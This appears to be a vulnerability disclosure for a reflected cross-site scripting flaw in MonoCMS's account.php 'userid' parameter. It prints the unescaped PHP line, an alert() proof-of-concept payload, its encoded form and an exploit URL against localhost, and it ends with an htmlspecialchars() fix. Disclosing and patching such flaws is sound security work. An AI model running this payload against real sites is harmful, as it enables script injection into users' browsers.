# CVE-2024-10927 - [XSS vulnerability] found in MonoCMS 23-20240528 - (/monofiles/account.php)


Affected Project: **MonoCMS**

Exploit Author: Dimitris Chatzidimitris

Web: Php

Vendor: MonoCMS

Official Website: (https://monocms.com/)

Version: 23-20240528

Updated: 28 May, 2024

Related Code file: /monofiles/account.php

Injection parameter: `userid`

<br />

Sha1: 9532cda20cf7fa456d6f00ce0fe194767913ba83

<br />

## Vulnerability Description:
The issue arises because the `userid` parameter from the URL is being directly inserted into the value attribute of an HTML input element without proper sanitization. 
This allows an attacker to inject arbitrary HTML or JavaScript code leading to an XSS attack.

<br />

## Vulnerable code:
```
<input name="hiddenid" type="text" value="<?php if (isset($_GET['userid'])) print $_GET['userid'] ?>" hidden>
```

<br />

## Injection Payload Tested:

We set `userid` to:
```
"><script>alert('XSS')</script>
```

<br />

## URL-encoded, this becomes:
```
%22%3E%3Cscript%3Ealert('XSS')%3C/script%3E
```

<br />

## Resulting HTML After Injection:
```
<input name="hiddenid" type="text" value=""><script>alert('XSS')</script>" hidden>
```


The injected `"></script>` closes the value attribute and the input tag, allowing the `<script>` tag to be inserted into the DOM.

<br />

## Execution:

When the browser parses this HTML, it executes the `<script>alert('XSS')</script>` code, resulting in a popup displaying `"XSS"`.

<br />

## Demonstration:

Below is how `/monofiles/account.php` looks like:

<br />

![account.php](https://i.postimg.cc/dV25sxCv/1.png)

<br />

Then we can add our payload `"><script>alert('XSS by secuserx')</script>` :
```
http://localhost:8080/monofiles/account.php?userid="><script>alert('XSS by secuserx')</script>
```

<br />

![payload](https://i.postimg.cc/CKwmzsC8/2.png)

<br />

After submitting the url with the vulnerable parameter `userid` and the XSS payload `"><script>alert('XSS by secuserx')</script>`, XSS is triggered:

<br />

![xss](https://i.postimg.cc/pdkk85k6/3.png)

<br />

## Recommendation for Preventing XSS:

To fix this vulnerability, we must always sanitize user inputs before rendering them in the HTML. We can use functions like htmlspecialchars() in PHP to encode special characters.

<br />

Example:
```
<input name="hiddenid" type="text" value="<?php if (isset($_GET['userid'])) print htmlspecialchars($_GET['userid'], ENT_QUOTES, 'UTF-8') ?>" hidden>
```

<br />

> One Click Can Change Everything: Be Secure.
